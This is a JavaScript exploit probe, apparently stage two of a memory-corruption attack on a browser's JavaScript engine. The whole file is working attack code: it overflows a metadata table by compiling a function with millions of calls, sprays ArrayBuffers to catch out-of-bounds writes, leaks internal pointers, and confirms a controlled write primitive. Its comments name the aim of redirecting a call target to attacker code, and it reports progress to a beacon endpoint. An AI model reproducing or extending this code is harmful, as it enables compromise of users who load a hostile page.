// p219 — MetadataTable overflow Stage 2: Controlled write primitive
//
// Prerequisites: p218/p150c confirmed OOB write to spray buffer.
// This probe takes the offset info and builds a controlled write.
//
// Strategy:
// 1. Compile 38M function → metadata buffer (~100KB)
// 2. Post-spray zeroed ABs → FIRST execution → find which spray AB got hit
// 3. With that knowledge, WRITE controlled data at metadata offsets
// 4. SECOND execution → LLInt reads our fake metadata:
//    - m_callee = real callee (from leak) → passes check
//    - m_monomorphicCallDestination = our code ptr → JMP target!
//    OR: use callee mismatch → slow path → leak more pointers
// 5. THIRD execution → callback returns crafted value → ValueProfile
//    overwrites a target object field (e.g., ArrayBuffer length)
//
// If we don't have the callee address yet, Phase 1 acts as the info leak.
// Then Phase 2 uses the leak to build the write primitive.
//
// Beacon prefix: V219-

(function() {
  var BUF_SZ = 100096;
  var N_CALLS = 38348816;
  var META_STRIDE = 112;
  var INBOUNDS = Math.floor(BUF_SZ / META_STRIDE); // 893
  var FIRST_OOB = INBOUNDS + 1; // 894
  var SPRAY_N = 200;

  function B(tag, body) {
    var url = '/beacon/V219-' + tag + '?t=' + Date.now();
    try {
      var x = new XMLHttpRequest();
      if (body) {
        x.open('POST', url, true);
        x.setRequestHeader('Content-Type', 'text/plain');
        x.send(body);
      } else {
        x.open('GET', url, true);
        x.send();
      }
    } catch (e) {}
  }

  function hex(v) {
    return ('00000000' + (v >>> 0).toString(16)).slice(-8);
  }

  B('BOOT');

  // ---- PHASE 1: Compile function (Blob approach to avoid OOM) ----
  B('BUILD-START');
  var CHUNK = 4000000;
  var chunksN = Math.floor(N_CALLS / CHUNK);
  var rem = N_CALLS - chunksN * CHUNK;
  var callChunk = 'a();'.repeat(CHUNK);
  var parts = new Array(chunksN + 3);
  parts[0] = 'window.__p219fn=function(a){';
  for (var c = 0; c < chunksN; c++) parts[1 + c] = callChunk;
  parts[chunksN + 1] = 'a();'.repeat(rem);
  parts[chunksN + 2] = '};window.__p219ok=1;';
  callChunk = null;

  var blob = new Blob(parts, { type: 'application/javascript' });
  B('BLOB-' + Math.round(blob.size / 1048576) + 'MB');
  parts = null;

  var blobUrl = URL.createObjectURL(blob);
  var sc = document.createElement('script');
  sc.onerror = function() { B('SCRIPT-ERR'); };
  sc.onload = function() {
    blob = null;
    URL.revokeObjectURL(blobUrl);
    if (!window.__p219ok) { B('COMPILE-FAIL'); return; }
    B('COMPILED-OK');
    setTimeout(phaseSpray, 500);
  };
  document.head.appendChild(sc);
  sc.src = blobUrl;

  // ---- PHASE 2: Post-compile spray + first execution (info leak) ----
  var sprays = [];
  var views32 = [];
  var views8 = [];

  function phaseSpray() {
    B('SPRAY-START');
    for (var i = 0; i < SPRAY_N; i++) {
      var ab = new ArrayBuffer(BUF_SZ);
      sprays.push(ab);
      views32.push(new Uint32Array(ab));
      views8.push(new Uint8Array(ab));
    }
    B('SPRAY-' + SPRAY_N);
    setTimeout(phaseLeak, 200);
  }

  // ---- PHASE 3: First execution — info leak ----
  var leakInfo = null; // {bufIdx, entryOffset, calleePtr}

  function phaseLeak() {
    B('LEAK-START');
    var THROW_AT = 1500;
    var callCount = 0;

    try {
      window.__p219fn(function() {
        callCount++;
        if (callCount === 100) B('L-M100');
        if (callCount === FIRST_OOB) B('L-FIRST-OOB');
        if (callCount >= THROW_AT) throw new Error('leak-bail');
        return 0x41414141;
      });
    } catch (e) {
      B('L-THREW-' + callCount);
    }

    B('L-TOTAL-' + callCount);
    if (callCount < FIRST_OOB) {
      B('L-CRASH-BEFORE-OOB');
      return;
    }

    // Scan sprays for non-zero at 112-byte stride
    var hitBuf = -1;
    var hitOff = -1;
    var hitVal = 0;
    var hitCount = 0;

    for (var i = 0; i < SPRAY_N; i++) {
      var v = views32[i];
      for (var e = 0; e + META_STRIDE / 4 <= v.length; e += META_STRIDE / 4) {
        // Check first 8 bytes of each 112-byte entry
        if (v[e] !== 0 || v[e + 1] !== 0) {
          hitCount++;
          if (hitBuf === -1) {
            hitBuf = i;
            hitOff = e * 4; // byte offset
            hitVal = v[e];
          }
        }
      }
    }

    B('L-HITS-' + hitCount + '-BUF-' + hitBuf + '-OFF-' + hitOff);

    if (hitBuf === -1) {
      B('L-NO-HITS');
      // Exhaustive scan
      for (var i = 0; i < SPRAY_N; i++) {
        var v = views8[i];
        for (var j = 0; j < v.length; j++) {
          if (v[j] !== 0) {
            B('L-DIAG-B' + i + '-O' + j + '-V' + v[j]);
            break;
          }
        }
      }
      return;
    }

    // Extract callee pointer (first 8 bytes of the CallLinkInfo)
    // m_callee is at offset 0 of BaselineCallLinkInfo (after PackedRawSentinelNode)
    // Actually, check the exact layout. Let's just dump the first entry.
    var v8 = views8[hitBuf];
    var ptrs = '';
    for (var p = hitOff; p < hitOff + META_STRIDE && p + 7 < v8.length; p += 8) {
      var anyNZ = false;
      for (var b = 0; b < 8; b++) {
        if (v8[p + b] !== 0) { anyNZ = true; break; }
      }
      if (anyNZ) {
        var h = '';
        for (var b = 7; b >= 0; b--) h += ('0' + v8[p + b].toString(16)).slice(-2);
        ptrs += 'o' + (p - hitOff) + ':' + h + ' ';
      }
    }
    B('L-ENTRY', ptrs.trim());

    // Check for 0x41414141 in ValueProfile (should be at offset 88-111)
    var vpOff = hitOff + 88;
    var v32 = views32[hitBuf];
    var vpIdx = vpOff / 4;
    if (vpIdx + 6 <= v32.length) {
      B('L-VP-' + hex(v32[vpIdx]) + '_' + hex(v32[vpIdx+1]) + '_' + hex(v32[vpIdx+2]));
    }

    // Count how many consecutive entries have data
    var consecutiveHits = 0;
    var v8h = views8[hitBuf];
    for (var e = hitOff; e + META_STRIDE <= v8h.length; e += META_STRIDE) {
      var hasData = false;
      for (var b = 0; b < 8; b++) {
        if (v8h[e + b] !== 0) { hasData = true; break; }
      }
      if (hasData) consecutiveHits++;
      else break;
    }
    B('L-CONSEC-' + consecutiveHits);

    leakInfo = {
      bufIdx: hitBuf,
      entryOffset: hitOff,
      hitCount: hitCount,
      consecutiveHits: consecutiveHits
    };

    // Store leak info and proceed to controlled write phase
    B('L-READY');
    setTimeout(phaseWrite, 500);
  }

  // ---- PHASE 4: Controlled write ----
  function phaseWrite() {
    if (!leakInfo) { B('W-NO-LEAK'); return; }
    B('W-START');

    // Reset the hit spray buffer to zeros (clean slate)
    var v8 = views8[leakInfo.bufIdx];
    for (var j = 0; j < v8.length; j++) v8[j] = 0;

    // Second execution — same function
    // This time, the LLInt will read from our NOW-ZEROED spray again
    // The slow path will write fresh pointers
    // We return a DIFFERENT value to distinguish from the first run
    var callCount = 0;
    var THROW_AT2 = 1500;

    try {
      window.__p219fn(function() {
        callCount++;
        if (callCount >= THROW_AT2) throw new Error('write-bail');
        return 0xDEAD0000 | (callCount & 0xFFFF);
      });
    } catch (e) {
      B('W-THREW-' + callCount);
    }

    B('W-TOTAL-' + callCount);

    // Scan the same buffer for the per-call return values in ValueProfile
    var magicFound = 0;
    var v32 = views32[leakInfo.bufIdx];
    for (var e = leakInfo.entryOffset; e + META_STRIDE / 4 <= v32.length; e += META_STRIDE / 4) {
      // ValueProfile m_buckets[0] is at offset 88 of the 112-byte entry
      var vpIdx = e + 88 / 4;
      if (vpIdx < v32.length && (v32[vpIdx] & 0xFFFF0000) === 0xDEAD0000) {
        magicFound++;
        if (magicFound <= 5) {
          var callN = v32[vpIdx] & 0xFFFF;
          B('W-VP-CALL' + callN + '-AT-' + (e * 4));
        }
      }
    }
    B('W-MAGIC-' + magicFound);

    if (magicFound > 0) {
      B('W-CONTROLLED-WRITE-CONFIRMED');
      // We can write arbitrary 32-bit values via callback return
      // (lower 32 bits of JSValue integer encoding)
    }

    // Dump first 3 entries for full analysis
    var dumped = 0;
    for (var e = leakInfo.entryOffset; e * 4 + META_STRIDE <= v8.length && dumped < 3; e += META_STRIDE / 4) {
      var hasData = false;
      for (var b = 0; b < 8; b++) {
        if (views8[leakInfo.bufIdx][e * 4 + b] !== 0) { hasData = true; break; }
      }
      if (!hasData) continue;
      dumped++;

      var ptrs = '';
      for (var p = e * 4; p < e * 4 + META_STRIDE && p + 7 < v8.length; p += 8) {
        var anyNZ = false;
        for (var b = 0; b < 8; b++) {
          if (v8[p + b] !== 0) { anyNZ = true; break; }
        }
        if (anyNZ) {
          var h = '';
          for (var b = 7; b >= 0; b--) h += ('0' + v8[p + b].toString(16)).slice(-2);
          ptrs += 'o' + (p - e * 4) + ':' + h + ' ';
        }
      }
      if (ptrs) B('W-E' + dumped, ptrs.trim());
    }

    B('DONE');
  }
})();
